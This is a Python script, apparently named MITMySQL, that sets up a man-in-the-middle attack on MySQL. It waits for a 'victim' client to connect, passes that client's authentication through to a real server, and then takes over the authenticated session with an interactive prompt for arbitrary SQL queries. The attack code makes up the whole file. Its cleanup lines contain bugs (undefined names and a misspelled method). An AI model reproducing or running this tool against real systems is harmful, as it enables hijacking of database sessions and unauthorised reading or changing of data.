# -*- coding: utf-8 -*-

from pymysql_wrapper import ConnectionWrapper
from pymysql.connections import _makefile

import socket
import logging
import argparse

log_level = logging.INFO

logger = logging.getLogger(__name__)
logger.setLevel(log_level)

handler = logging.StreamHandler()
handler.setLevel(log_level)
logger.addHandler(handler)

logger.propagate = False


def authenticate(client, server):
    # initialize
    server._rfile = _makefile(server._sock, 'rb')
    server._next_seq_id = 0
    client.send(server._get_server_information())
    logger.info("[+] GOT SERVER INFORMATION: {}".format(server.get_server_info()))
    
    # passthrough the authentication information between client and server
    while True:
        client_payload = client.recv(4096)
        logger.debug("[*] REQUEST: {}".format(client_payload))
        server.write_packet(client_payload[4:])

        # ok response is the sign for the time when the authentication is succeeded.
        if server._read_packet().is_ok_packet():
            logger.debug("[*] AUTHENTICATION PROCESS.")
            break
        
    logger.info("[+] AUTHENTICATION SUCCEEDED")
    
def main(local_addr, server_addr):
    logger.debug("[*] MITMySQL INFORMATION: {}, {}".format(local_addr, server_addr))

    # prepare local sockets
    local_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    local_sock.bind(local_addr)
    local_sock.listen(1)

    # wait for a victim to connect here
    client_connection, client_addr = local_sock.accept()
    logger.info('[*] CONNECTED BY: {}'.format(client_addr))

    # prepare remote socket
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.connect(server_addr)
    server_connection = ConnectionWrapper(defer_connect=True)
    server_connection._sock = server_sock
    
    # bypass authentication
    authenticate(client_connection, server_connection)

    # you can do everything here with cursor
    with server_connection.cursor() as cursor:
        while True:
            try:
                sql_query = input("> ")
                cursor.execute(sql_query)
                print(cursor.fetchall())
            except Exception as e:
                print("Error occured: {}".format(e))
                
    # finalize
    conn.close()
    local_sock.close()
    remote_sock.cklose()
    
if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='MITM for MySQL.')
    parser.add_argument('--lport', metavar='3306', type=int, default=3306,
                        help='port to bind local MITM server')
    parser.add_argument('--rport', metavar='3306', type=int, default=3306,
                        help='port of a remote MySQL server')
    parser.add_argument('--host', metavar='3306', type=str, required=True,
                        help='host of a remote MySQL server')
    

    args = parser.parse_args()
    main(('0.0.0.0', args.lport), (args.host, args.rport))
